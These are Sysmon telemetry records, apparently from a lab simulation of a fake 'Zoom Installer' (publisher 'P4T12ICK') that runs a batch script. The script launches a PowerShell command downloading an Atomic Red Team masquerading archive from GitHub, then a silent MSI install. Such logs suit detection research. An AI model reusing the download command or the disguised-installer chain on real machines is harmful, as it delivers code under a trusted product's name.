{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 13, "Version": 2, "Level": 4, "Task": 13, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:47.0906361Z"}}, "EventRecordID": 12793, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "InvDB-Path", "EventType": "SetValue", "UtcTime": "2025-07-22 11:37:47.077", "ProcessGuid": "{1a289fba-7809-687f-a422-000000000700}", "ProcessId": 1340, "Image": "C:\\Windows\\system32\\compattelrunner.exe", "TargetObject": "\\REGISTRY\\A\\{aa20f418-29fc-52eb-45da-428766017978}\\Root\\InventoryApplicationFile\\unins000.exe|9182676167f05eef\\LowerCaseLongPath", "Details": "c:\\program files (x86)\\zoom installer\\unins000.exe", "User": "NT AUTHORITY\\SYSTEM"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:16.0116651Z"}}, "EventRecordID": 12780, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:37:16.010", "ProcessGuid": "{1a289fba-77ec-687f-a022-000000000700}", "ProcessId": 6700, "Image": "C:\\Windows\\SysWOW64\\msiexec.exe", "FileVersion": "5.0.20348.1 (WinBuild.160101.0800)", "Description": "Windows\u00ae installer", "Product": "Windows Installer - Unicode", "Company": "Microsoft Corporation", "OriginalFileName": "msiexec.exe", "CommandLine": "msiexec  /i C:\\Users\\Administrator\\Downloads\\ZoomInstallerFull.msi /quiet /qn /norestart /log install.log", "CurrentDirectory": "C:\\Program Files (x86)\\Zoom Installer\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=19688547147EC24D2403821707543E56,SHA256=D60EB25CED02E07DD11205FDA8CCE83F279593F261E4102C18106E4586D422DC,IMPHASH=E4E40938E4BF6C66424859ED02171C41", "ParentProcessGuid": "{1a289fba-77ea-687f-9d22-000000000700}", "ParentProcessId": 5016, "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe", "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Zoom Installer\\run.bat\" \"", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:14.6460777Z"}}, "EventRecordID": 12778, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:37:14.643", "ProcessGuid": "{1a289fba-77ea-687f-9f22-000000000700}", "ProcessId": 1356, "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.20348.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell  -Command \"& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip', 'C:\\Temp\\T1036.zip')}\"", "CurrentDirectory": "C:\\Program Files (x86)\\Zoom Installer\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=EB5ACAC8A6DF89EB6BA751F468490734,SHA256=6633D15A90D38137ABF5E08BC5C14CF35128ECA168E875D9569295ECC88A4DBB,IMPHASH=C1E3C5E2580A8F5AD5F3DF2BCAEA7CAB", "ParentProcessGuid": "{1a289fba-77ea-687f-9d22-000000000700}", "ParentProcessId": 5016, "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe", "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Zoom Installer\\run.bat\" \"", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:14.6073363Z"}}, "EventRecordID": 12777, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:37:14.605", "ProcessGuid": "{1a289fba-77ea-687f-9d22-000000000700}", "ProcessId": 5016, "Image": "C:\\Windows\\SysWOW64\\cmd.exe", "FileVersion": "10.0.20348.1 (WinBuild.160101.0800)", "Description": "Windows Command Processor", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "Cmd.Exe", "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Zoom Installer\\run.bat\" \"", "CurrentDirectory": "C:\\Program Files (x86)\\Zoom Installer\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=9FE95ED6B1F1194542E413FAC2E6116F,SHA256=F9B78911386A6AEB3582447593A218471F40AB780CAB2682F927DA1EC00034E2,IMPHASH=63B6D640EF299E8F8898CEA09B8AA342", "ParentProcessGuid": "{1a289fba-77e5-687f-9b22-000000000700}", "ParentProcessId": 4268, "ParentImage": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp", "ParentCommandLine": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp\" /SL5=\"$702B0,868341,867840,C:\\ZoomInstallerFull2.exe\" ", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 11, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:14.5056206Z"}}, "EventRecordID": 12775, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "T1023", "UtcTime": "2025-07-22 11:37:14.496", "ProcessGuid": "{1a289fba-77e5-687f-9b22-000000000700}", "ProcessId": 4268, "Image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom Installer\\Zoom Installer.lnk", "CreationUtcTime": "2025-07-22 11:37:14.496", "User": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 11, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:14.4923936Z"}}, "EventRecordID": 12774, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "T1023", "UtcTime": "2025-07-22 11:37:14.480", "ProcessGuid": "{1a289fba-77e5-687f-9b22-000000000700}", "ProcessId": 4268, "Image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom Installer", "CreationUtcTime": "2025-07-22 11:37:14.480", "User": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:09.9148380Z"}}, "EventRecordID": 12773, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:37:09.906", "ProcessGuid": "{1a289fba-77e5-687f-9b22-000000000700}", "ProcessId": 4268, "Image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp", "FileVersion": "51.1052.0.0", "Description": "Setup/Uninstall", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-SNP3P.tmp\\ZoomInstallerFull2.tmp\" /SL5=\"$702B0,868341,867840,C:\\ZoomInstallerFull2.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=5AF8D5BA798D8628A6858867B4C941C6,SHA256=DCB9788895EF126B3E54CD06DD826C1746CFEF814EBAD5F177F7CF5FFD4F2731,IMPHASH=D9022E87B984803CDAB2208819B430C2", "ParentProcessGuid": "{1a289fba-77e5-687f-9a22-000000000700}", "ParentProcessId": 3188, "ParentImage": "C:\\ZoomInstallerFull2.exe", "ParentCommandLine": "\"C:\\ZoomInstallerFull2.exe\" ", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:37:09.8201134Z"}}, "EventRecordID": 12771, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:37:09.815", "ProcessGuid": "{1a289fba-77e5-687f-9a22-000000000700}", "ProcessId": 3188, "Image": "C:\\ZoomInstallerFull2.exe", "FileVersion": "                    ", "Description": "Zoom Installer Setup                                        ", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\ZoomInstallerFull2.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=72E0A8D2613E5A0CF6523358E9AC4F2B,SHA256=9FD21129BDBC61EF5AEE4760DA4F0A9A512034B5A111A93B3610AE73BCF386B7,IMPHASH=EFD455830BA918DE67076B7C65D86586", "ParentProcessGuid": "{1a289fba-2a39-687e-a004-000000000700}", "ParentProcessId": 4280, "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:36:25.6658962Z"}}, "EventRecordID": 12747, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:36:25.657", "ProcessGuid": "{1a289fba-77b9-687f-9222-000000000700}", "ProcessId": 1676, "Image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-55RL4.tmp\\ZipDownloaderSetup.tmp", "FileVersion": "51.1052.0.0", "Description": "Setup/Uninstall", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-55RL4.tmp\\ZipDownloaderSetup.tmp\" /SL5=\"$C032C,868341,867840,C:\\ZipDownloaderSetup.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=5AF8D5BA798D8628A6858867B4C941C6,SHA256=DCB9788895EF126B3E54CD06DD826C1746CFEF814EBAD5F177F7CF5FFD4F2731,IMPHASH=D9022E87B984803CDAB2208819B430C2", "ParentProcessGuid": "{1a289fba-77b9-687f-9122-000000000700}", "ParentProcessId": 9116, "ParentImage": "C:\\ZipDownloaderSetup.exe", "ParentCommandLine": "\"C:\\ZipDownloaderSetup.exe\" ", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:36:25.5627372Z"}}, "EventRecordID": 12746, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:36:25.562", "ProcessGuid": "{1a289fba-77b9-687f-9122-000000000700}", "ProcessId": 9116, "Image": "C:\\ZipDownloaderSetup.exe", "FileVersion": "                    ", "Description": "Zoom Installer Setup                                        ", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\ZipDownloaderSetup.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=72E0A8D2613E5A0CF6523358E9AC4F2B,SHA256=9FD21129BDBC61EF5AEE4760DA4F0A9A512034B5A111A93B3610AE73BCF386B7,IMPHASH=EFD455830BA918DE67076B7C65D86586", "ParentProcessGuid": "{1a289fba-2a39-687e-a004-000000000700}", "ParentProcessId": 4280, "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:36:21.3002992Z"}}, "EventRecordID": 12744, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:36:21.292", "ProcessGuid": "{1a289fba-77b5-687f-8f22-000000000700}", "ProcessId": 7940, "Image": "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-9TAFF.tmp\\ZipDownloaderSetup.tmp", "FileVersion": "51.1052.0.0", "Description": "Setup/Uninstall", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\is-9TAFF.tmp\\ZipDownloaderSetup.tmp\" /SL5=\"$1502BC,868341,867840,C:\\ZipDownloaderSetup.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=5AF8D5BA798D8628A6858867B4C941C6,SHA256=DCB9788895EF126B3E54CD06DD826C1746CFEF814EBAD5F177F7CF5FFD4F2731,IMPHASH=D9022E87B984803CDAB2208819B430C2", "ParentProcessGuid": "{1a289fba-77b5-687f-8e22-000000000700}", "ParentProcessId": 6840, "ParentImage": "C:\\ZipDownloaderSetup.exe", "ParentCommandLine": "\"C:\\ZipDownloaderSetup.exe\" ", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}
{"Event": {"#attributes": {"xmlns": "{http://schemas.microsoft.com/win/2004/08/events/event}"}, "System": {"Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}}, "EventID": 1, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"#attributes": {"SystemTime": "2025-07-22T11:36:21.1882845Z"}}, "EventRecordID": 12742, "Correlation": "", "Execution": {"#attributes": {"ProcessID": "3244", "ThreadID": "4048"}}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "PB-win-dc.lab.local", "Security": {"#attributes": {"UserID": "S-1-5-18"}}}, "EventData": {"RuleName": "-", "UtcTime": "2025-07-22 11:36:21.183", "ProcessGuid": "{1a289fba-77b5-687f-8e22-000000000700}", "ProcessId": 6840, "Image": "C:\\ZipDownloaderSetup.exe", "FileVersion": "                    ", "Description": "Zoom Installer Setup                                        ", "Product": "Zoom Installer                                              ", "Company": "P4T12ICK                                                    ", "OriginalFileName": "                                                  ", "CommandLine": "\"C:\\ZipDownloaderSetup.exe\" ", "CurrentDirectory": "C:\\", "User": "lab\\Administrator", "LogonGuid": "{1a289fba-2a37-687e-cc6d-380000000000}", "LogonId": "0x386dcc", "TerminalSessionId": 2, "IntegrityLevel": "High", "Hashes": "MD5=72E0A8D2613E5A0CF6523358E9AC4F2B,SHA256=9FD21129BDBC61EF5AEE4760DA4F0A9A512034B5A111A93B3610AE73BCF386B7,IMPHASH=EFD455830BA918DE67076B7C65D86586", "ParentProcessGuid": "{1a289fba-2a39-687e-a004-000000000700}", "ParentProcessId": 4280, "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\Explorer.EXE", "ParentUser": "lab\\Administrator"}}, "submission_id": "8a37e1ff-8530-47bd-b736-a2dcea4ed8ac"}